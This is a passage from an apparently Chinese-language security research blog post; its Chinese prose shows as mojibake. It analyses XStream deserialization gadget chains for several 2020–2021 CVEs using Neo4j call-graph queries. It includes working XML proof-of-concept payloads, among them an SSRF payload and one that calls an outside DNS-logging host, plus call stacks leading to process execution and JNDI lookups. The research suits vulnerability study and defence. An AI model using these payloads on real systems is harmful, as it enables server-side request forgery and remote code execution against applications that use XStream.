class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">order</span>&gt;</span>false<span class="tag">&lt;/<span class="name">order</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.client.ResponseContext&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span> <span class="attr">class</span>=<span class="string">&quot;java.util.IdentityHashMap&quot;</span> <span class="attr">serialization</span>=<span class="string">&quot;custom&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">size</span>&gt;</span>0<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">java.util.IdentityHashMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">satellites</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;javax.activation.URLDataSource&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://cve21342.xstream.1.dns.m0d9.me/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">wasTransportSecure</span>&gt;</span>false<span class="tag">&lt;/<span class="name">wasTransportSecure</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isAdapterDeliversNonAnonymousResponse</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span>false<span class="tag">&lt;/<span class="name">packetTakesPriorityOverRequestContext</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">state</span>&gt;</span>ServerRequest<span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">isFastInfosetDisabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">isFastInfosetDisabled</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-39152"><a href="#CVE-2021-39152" class="headerlink" title="CVE-2021-39152"></a>CVE-2021-39152</h3><p>è¿™ä¸ªé“¾åº”è¯¥æ˜¯ ssrfæœ€çŸ­çš„é“¾äº†</p><h4 id="å¯»æ‰¾Bullet-1"><a href="#å¯»æ‰¾Bullet-1" class="headerlink" title="å¯»æ‰¾Bullet"></a>å¯»æ‰¾Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="å¯»æ‰¾ä¸­é—´é“¾-1"><a href="#å¯»æ‰¾ä¸­é—´é“¾-1" class="headerlink" title="å¯»æ‰¾ä¸­é—´é“¾"></a>å¯»æ‰¾ä¸­é—´é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match path&#x3D;(m1:Method)-[r:CALL]-(m2:Method&#123;NAME:&quot;openConnection&quot;,CLASSNAME:&quot;java.net.URL&quot;&#125;) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br></pre></td></tr></table></figure><p>èŠ‚ç‚¹å¾ˆå¤šï¼Œä»¥jdk.nashorn.internal.runtime.Source$URLData#loadMeta ä¸ºä¾‹<br><img src="/images/pasted-160.png" alt="upload successful"></p><h4 id="å¯»æ‰¾Trigger-1"><a href="#å¯»æ‰¾Trigger-1" class="headerlink" title="å¯»æ‰¾Trigger"></a>å¯»æ‰¾Trigger</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URL URLData</span><br><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where  m1.NAME&#x3D;&quot;loadMeta&quot; and m1.CLASSNAME&#x3D;&quot;jdk.nashorn.internal.runtime.Source$URLData&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;, 10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-159.png" alt="upload successful"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">cs</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8080/internal/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">cs</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs&#x27;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hash</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">hash</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">array</span>&gt;</span>b<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">length</span>&gt;</span>0<span class="tag">&lt;/<span class="name">length</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">lastModified</span>&gt;</span>0<span class="tag">&lt;/<span class="name">lastModified</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.runtime.Source_-URLData</span> <span class="attr">reference</span>=<span class="string">&#x27;../jdk.nashorn.internal.runtime.Source_-URLData&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1"><a href="#å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1"></a>å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾1</h4><p>ä¸­é—´é“¾ä»¥com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces#parseSomeä¸ºä¾‹</p><p><img src="/images/pasted-171.png" alt="upload successful"></p><p><img src="/images/pasted-172.png" alt="upload successful"><br>å‘ç°methodã€classã€argséƒ½å¯æ§ï¼Œéœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°ä¸€æ¡é“¾</p><h4 id="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2"><a href="#å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2" class="headerlink" title="å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2"></a>å¯»æ‰¾æ ¸å¿ƒè°ƒç”¨é“¾2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;parseSome&quot; and m1.CLASSNAME&#x3D;&quot;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-170.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><p>è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">parseSome:370, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:309, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:814, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:534, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:1294, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:206, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:312, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:121, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h3><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾"></a>æ ¸å¿ƒè°ƒç”¨é“¾</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;createValue&quot; and m1.CLASSNAME&#x3D;&quot;sun.swing.SwingLazyValue&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-175.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ-1"><a href="#è°ƒç”¨æ ˆ-1" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">doLookup:290, InitialContext (javax.naming)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">createValue:73, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:216, UIDefaults (javax.swing)</span><br><span class="line">get:161, UIDefaults (javax.swing)</span><br><span class="line">get:64, MultiUIDefaults (javax.swing)</span><br><span class="line">toString:197, MultiUIDefaults (javax.swing)</span><br><span class="line">equals:391, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:441, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:420, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:568, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-21347-21350"><a href="#CVE-2020-21347-21350" class="headerlink" title="CVE-2020-21347/21350"></a>CVE-2020-21347/21350</h3><p>21347/21350è¿™ä¸¤ä¸ªç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨NameProcessIteratorè‡ªå®šä¹‰classloaderåŠ è½½ï¼Œé“¾ä¹Ÿæ¯”è¾ƒç®€å•ã€‚</p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾1"></a>æ ¸å¿ƒè°ƒç”¨é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(sink:Method &#123;IS_SINK:true, NAME:&quot;loadClass&quot;&#125;)&lt;-[:CALL]-(m1:Method) return m1.CLASSNAME,m1.NAME,m1.PARAMETERS</span><br><span class="line">order by m1.CLASSNAME</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-176.png" alt="upload successful"></p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾2"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾2" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾2"></a>æ ¸å¿ƒè°ƒç”¨é“¾2</h4><p>æ¯”è¾ƒéš¾æçš„æ˜¯hasNextå…³è”Nextï¼Œå¾ˆå®¹æ˜“å…³è”åˆ°Triggerï¼Œé€ æˆè¯¯æŠ¥</p><p>éœ€è¦æ‰‹åŠ¨å‘ç°è‡³SequenceInputStream.nextStreamï¼Œç„¶åå‚è€ƒCVE-2020-26217çš„ByteArrayOutputStreamExé“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">match path&#x3D;(m1:Method&#123;NAME:&quot;hasNext&quot;,CLASSNAME:&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;&#125;)-[r:CALL|ALIAS*3..10]-(m2:Method) </span><br><span class="line">where m2.NAME in [&quot;toString&quot;]</span><br><span class="line">return path limit 200</span><br></pre></td></tr></table></figure><p>è¿™éƒ¨åˆ†çš„ä¸ä¹‹ç±»ä¼¼ï¼Œä¸å•ç‹¬åˆ—äº†</p><h4 id="è°ƒç”¨æ ˆ-2"><a href="#è°ƒç”¨æ ˆ-2" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">loadClass:131, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">hasNext:409, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h3><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾1-1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾1-1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾1"></a>æ ¸å¿ƒè°ƒç”¨é“¾1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;compare&quot;,&quot;hashCode&quot;,&quot;equals&quot;,&quot;compareTo&quot;,&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;filter&quot; and m1.CLASSNAME&#x3D;&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,10) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-173.png" alt="upload successful"></p><h4 id="è½¬æ¥ç‚¹"><a href="#è½¬æ¥ç‚¹" class="headerlink" title="è½¬æ¥ç‚¹"></a>è½¬æ¥ç‚¹</h4><p>å¯ä»¥çœ‹åˆ°ï¼Œåªæ ‡æ³¨äº†éƒ¨åˆ†çš„é“¾ï¼ŒåŸå› ä¸ºjavax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator#nextElement-&gt;java.util.Enumeration#nextElement-&gt; javax.naming.NameImpl#equals æ— æ³•èµ°é€šã€‚è¿™ç§æƒ…å†µåœ¨åç»­çš„caseç§ä¹Ÿä¼šç»å¸¸é‡åˆ°ï¼Œå› ä¸ºJavaæœ‰å¤šæ€ç‰¹æ€§ï¼Œè€ŒALIASæ˜¯çº¯é™æ€åˆ†æã€‚</p><p>ä¸Šè¿°é“¾æ²¡åŠæ³•æ‰“é€šTriggerï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ‰‹åŠ¨åˆ†æï¼Œå‘ç°java.io.SequenceInputStream#nextStreamå¯ä»¥è°ƒç”¨e.nextElementä¸”eå¯æ§ã€‚å¦‚æ­¤ï¼Œæ¥ç€åˆ†ænextStreamåˆ°Triggerçš„å¯è¡Œæ€§ã€‚</p><h4 id="æ ¸å¿ƒè°ƒç”¨é“¾2-1"><a href="#æ ¸å¿ƒè°ƒç”¨é“¾2-1" class="headerlink" title="æ ¸å¿ƒè°ƒç”¨é“¾2"></a>æ ¸å¿ƒè°ƒç”¨é“¾2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">match (source:Method) where source.NAME in [&quot;toString&quot;]</span><br><span class="line">match (m1:Method) where m1.NAME&#x3D;&quot;nextStream&quot; and m1.CLASSNAME&#x3D;&quot;java.io.SequenceInputStream&quot;</span><br><span class="line">call apoc.algo.allSimplePaths(m1, source, &quot;&lt;CALL|ALIAS&quot;,8) yield path </span><br><span class="line">return * limit 100</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-174.png" alt="upload successful"></p><h4 id="è°ƒç”¨æ ˆ-3"><a href="#è°ƒç”¨æ ˆ-3" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">start:1007, ProcessBuilder (java.lang)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect) [2]</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">filter:613, ImageIO$ContainsFilter (javax.imageio)</span><br><span class="line">advance:834, FilterIterator (javax.imageio.spi)</span><br><span class="line">next:852, FilterIterator (javax.imageio.spi)</span><br><span class="line">nextElement:153, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:110, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">getStringValue:121, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hashCode:117, NativeString (jdk.nashorn.internal.objects)</span><br><span class="line">hash:339, HashMap (java.util)</span><br><span class="line">put:612, HashMap (java.util)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21344-21345"><a href="#CVE-2021-21344-21345" class="headerlink" title="CVE-2021-21344/21345"></a>CVE-2021-21344/21345</h3><p>21344/21345çš„è¿™ä¸ªGadgetsæ ¸å¿ƒåœ¨DataTransferer$IndexedComparatoråˆ°GetterSetterReflectionçš„æµç¨‹ï¼Œæµç¨‹æ¯”è¾ƒå¤æ‚</p><h4 id="è°ƒç”¨æ ˆ-4"><a href="#è°ƒç”¨æ ˆ-4" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">verify:173, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart 